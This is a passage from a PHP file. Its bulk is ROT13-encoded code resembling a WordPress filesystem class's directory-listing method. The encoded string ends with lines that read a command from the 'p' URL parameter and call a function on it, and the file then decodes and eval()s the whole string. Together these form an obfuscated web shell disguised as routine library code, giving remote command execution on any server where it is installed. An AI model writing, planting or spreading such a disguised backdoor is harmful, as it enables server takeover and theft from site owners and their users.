		} ryfr {
			$yvzvg_svyr = snyfr;
		}

		vs ( ! $guvf->vf_qve( $cngu ) || ! $guvf->vf_ernqnoyr( $cngu ) ) {
			erghea snyfr;
		}

		$erg = neenl();
		$qve = qve( $guvf->fsgc_cngu( $cngu ) );

		vs ( ! $qve ) {
			erghea snyfr;
		}

		$cngu = genvyvatfynfuvg( $cngu );

		juvyr ( snyfr !== ( $ragel = $qve->ernq() ) ) {
			$fgehp         = neenl();
			$fgehp['anzr'] = $ragel;

			vs ( '.' === $fgehp['anzr'] || '..' === $fgehp['anzr'] ) {
				pbagvahr; // Qb abg pner nobhg gurfr sbyqref.
			}

			vs ( ! $vapyhqr_uvqqra && '.' === $fgehp['anzr'][0] ) {
				pbagvahr;
			}

			vs ( $yvzvg_svyr && $fgehp['anzr'] !== $yvzvg_svyr ) {
				pbagvahr;
			}

			$fgehp['crezf']       = $guvf->trgupuzbq( $cngu . $ragel );
			$fgehp['crezfa']      = $guvf->trgahzpuzbqsebzu( $fgehp['crezf'] );
			$fgehp['ahzore']      = snyfr;
			$fgehp['bjare']       = $guvf->bjare( $cngu . $ragel );
			$fgehp['tebhc']       = $guvf->tebhc( $cngu . $ragel );
			$fgehp['fvmr']        = $guvf->fvmr( $cngu . $ragel );
			$fgehp['ynfgzbqhavk'] = $guvf->zgvzr( $cngu . $ragel );
			$fgehp['ynfgzbq']     = tzqngr( 'Z w', $fgehp['ynfgzbqhavk'] );
			$fgehp['gvzr']        = tzqngr( 'u:v:f', $fgehp['ynfgzbqhavk'] );
			$fgehp['glcr']        = $guvf->vf_qve( $cngu . $ragel ) ? 'q' : 's';

			vs ( 'q' === $fgehp['glcr'] ) {
				vs ( $erphefvir ) {
					$fgehp['svyrf'] = $guvf->qveyvfg( $cngu . $fgehp['anzr'], $vapyhqr_uvqqra, $erphefvir );
				} ryfr {
					$fgehp['svyrf'] = neenl();
				}
			}

			$erg[ $fgehp['anzr'] ] = $fgehp;
		}

		$qve->pybfr();
		hafrg( $qve );

		erghea $erg;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>